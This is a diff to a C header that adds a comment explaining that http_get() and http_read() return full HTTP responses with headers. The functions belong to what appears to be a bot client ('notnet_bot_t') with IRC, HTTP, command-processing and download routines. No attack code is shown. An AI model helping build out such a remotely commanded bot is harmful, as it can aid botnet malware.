@@ -160,6 +160,12 @@ void irc_disconnect(notnet_bot_t *bot);
 /* ── HTTP Functions ─────────────────────────────────────────── */
 int http_connect(notnet_bot_t *bot);
 int http_post(notnet_bot_t *bot, const char *data, int len);
+/* API CONTRACT (#60): http_get() and http_read() return the FULL HTTP
+ * response — status line, headers, and body — into buf, and return the
+ * total number of bytes received (or -1 on error, 0 when nothing was
+ * readable). They do NOT strip headers. Callers that need only the body
+ * must locate the "\r\n\r\n" header terminator themselves (as
+ * protocol_process_commands and http_download already do). */
 int http_get(notnet_bot_t *bot, char *buf, int len);
 int http_read(notnet_bot_t *bot, char *buf, int len);
 int http_download(notnet_bot_t *bot, const char *url, const char *dest);
